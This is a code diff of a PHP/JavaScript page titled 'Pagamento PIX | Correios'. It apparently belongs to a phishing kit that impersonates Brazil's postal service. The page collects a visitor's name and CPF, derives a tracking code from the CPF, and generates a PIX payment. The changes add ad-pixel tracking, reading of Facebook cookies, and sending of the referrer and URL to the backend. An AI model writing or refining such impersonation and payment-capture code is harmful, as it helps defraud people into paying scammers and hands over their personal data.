@@ -43,20 +43,11 @@ function gerarCodigoRastreioPorCpf(string $cpf): string
 }
 
 $cpfLimpo = preg_replace('/\D/', '', $cpf);
-$redirectParams = $_GET;
 
 if ($codigoRaw !== '') {
-    $redirectParams['codigo'] = preg_replace('/[^A-Z0-9]/i', '', $codigoRaw);
-    unset($redirectParams['cpf']);
+    $redirect = '../rastreio.html?codigo=' . rawurlencode(preg_replace('/[^A-Z0-9]/i', '', $codigoRaw));
 } elseif ($nome !== '' && $cpf !== '') {
-    $redirectParams['nome'] = $nome;
-    $redirectParams['cpf'] = $cpf;
-}
-
-if ($codigoRaw !== '') {
-    $redirect = '../rastreio.html?' . http_build_query($redirectParams);
-} elseif ($nome !== '' && $cpf !== '') {
-    $redirect = '../index5.html?' . http_build_query($redirectParams);
+    $redirect = '../index5.html?' . http_build_query(['nome' => $nome, 'cpf' => $cpf]);
 } else {
     $redirect = '../index.html';
 }
@@ -77,7 +68,7 @@ $codigoRastreio = $codigoRaw !== ''
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <script src="../assets/js/protect.js?v=20260814clear"></script>
   <script src="../assets/js/pixel-loader-utmify.js"></script>
-  <script src="../assets/js/pixel-utmify.js"></script>
+  <script src="../assets/js/pixel-utmify.js?v=20261018purchase"></script>
   <meta name="theme-color" content="#003366">
   <title>Pagamento PIX | Correios</title>
   <link rel="stylesheet" href="../assets/css/correios-mobile.css?v=20260814k">
@@ -350,6 +341,14 @@ $codigoRastreio = $codigoRaw !== ''
     }
   }
 
+  function readCookie(name) {
+    try {
+      var esc = name.replace(/([.$?*|{}()[\]\\/+^])/g, '\\$1');
+      var m = document.cookie.match(new RegExp('(?:^|; )' + esc + '=([^;]*)'));
+      return m ? decodeURIComponent(m[1]) : '';
+    } catch(e) { return ''; }
+  }
+
   async function gerarPix() {
     const nome = document.getElementById('name').value.trim();
     const cpf = document.getElementById('document').value.replace(/\D/g, '');
@@ -380,7 +379,11 @@ $codigoRastreio = $codigoRaw !== ''
           cidade: 'Brasília',
           estado: 'DF',
           valor: valorCentavos,
-          trackingParameters: getTrackingPayload()
+          trackingParameters: getTrackingPayload(),
+          fbp: readCookie('_fbp') || null,
+          fbc: readCookie('_fbc') || null,
+          referer: document.referrer || null,
+          url: location.href
         })
       });
 
